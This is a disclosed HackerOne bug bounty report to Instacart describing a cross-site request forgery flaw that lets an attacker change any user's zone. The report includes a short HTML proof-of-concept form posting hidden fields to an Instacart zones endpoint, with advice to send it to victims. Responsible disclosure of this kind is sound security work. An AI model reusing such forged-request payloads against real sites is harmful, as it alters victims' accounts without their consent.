# Cross-Site Request Forgery (CSRF)

## Report Details
- **Report ID**: 157993
- **URL**: https://hackerone.com/reports/157993
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-09T21:52:49.883Z
- **Disclosed**: 2016-10-13T20:21:53.860Z

## Reporter
- **Username**: malcolmx
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: instacart

## Vulnerability Information
Hello,

i found Cross-Site Request Forgery (CSRF) that can change any user ZONE 

POC:

```
<html>
  <body>
    <form action="https://admin.instacart.com/api/v2/zones" method="POST">
      <input type="hidden" name="zip" value="10001" />
      <input type="hidden" name="override" value="true" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```
put Zone you want send the request to any user and you will change his Zone

__Please Watch My POC I Attached For More Details__
Thanks

## Attachments
- CSRF_Change_Any_User_Zone_POC.mp4
